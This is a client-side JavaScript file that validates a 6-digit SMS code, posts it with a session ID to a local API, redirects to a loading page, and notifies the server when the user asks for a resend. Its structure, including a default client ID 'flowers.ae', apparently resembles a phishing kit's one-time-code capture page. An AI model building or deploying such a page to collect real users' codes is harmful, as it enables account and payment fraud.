console.log("✅ sms.js loaded");

(() => {
  const sessionId = localStorage.getItem("sessionId");
  const clientId = localStorage.getItem("clientId") || "flowers.ae";

  const smsInput = document.getElementById("sms");
  const loading = document.getElementById("loading");
  const submitBtn = document.getElementById("submit-btn");
  const errorBox = document.getElementById("error-msg");
  const smsForm = document.getElementById("sms-form");

  if (!submitBtn) return;

  // ✅ Только цифры и убираем красное если всё правильно
  smsInput.addEventListener("input", () => {
    smsInput.value = smsInput.value.replace(/\D/g, "");

    if (/^\d{6}$/.test(smsInput.value)) {
      smsInput.classList.remove("input-error");
      errorBox.style.display = "none";
    }
  });

  smsForm.addEventListener("submit", (e) => {
    e.preventDefault();
    handleSmsSubmit();
  });

  submitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    handleSmsSubmit();
  });

  function handleSmsSubmit() {
    const sms = smsInput.value.trim();

    if (!/^\d{6}$/.test(sms)) {
      smsInput.classList.add("input-error");
      errorBox.textContent = "Enter a valid 6-digit code";
      errorBox.style.display = "block";
      return;
    }

    smsInput.classList.remove("input-error");
    errorBox.style.display = "none";
    submitBtn.style.display = "none";
    loading.style.display = "block";

    fetch("/api/submit-sms", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId, sms }),
    })
      .then((r) => {
        if (!r.ok) throw new Error("Network error");
        return r.json();
      })
      .then(() => {
        window.location.href = "/loading";
      })
      .catch(() => {
        errorBox.textContent = "Network error";
        errorBox.style.display = "block";
      })
      .finally(() => {
        loading.style.display = "none";
        submitBtn.style.display = "block";
        smsInput.value = "";
      });
  }

  // Добавить в конец файла sms.js, после всех существующих обработчиков

  const resendBtn = document.getElementById("resend-btn");

  if (resendBtn) {
    resendBtn.addEventListener("click", () => {
      // Отправляем уведомление на сервер
      fetch("/api/resend-sms-notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId }),
      })
        .then((r) => r.json())
        .then((data) => {
          if (data.success) {
            errorBox.textContent = "SMS resent";
            errorBox.style.display = "block";
            errorBox.style.color = "#4d6aff";

            // Через 3 секунды скрываем сообщение
            setTimeout(() => {
              errorBox.style.display = "none";
              errorBox.style.color = "";
            }, 3000);
          }
        })
        .catch(() => {
          errorBox.textContent = "Ошибка отправки";
          errorBox.style.display = "block";
        });
    });
  }
})();
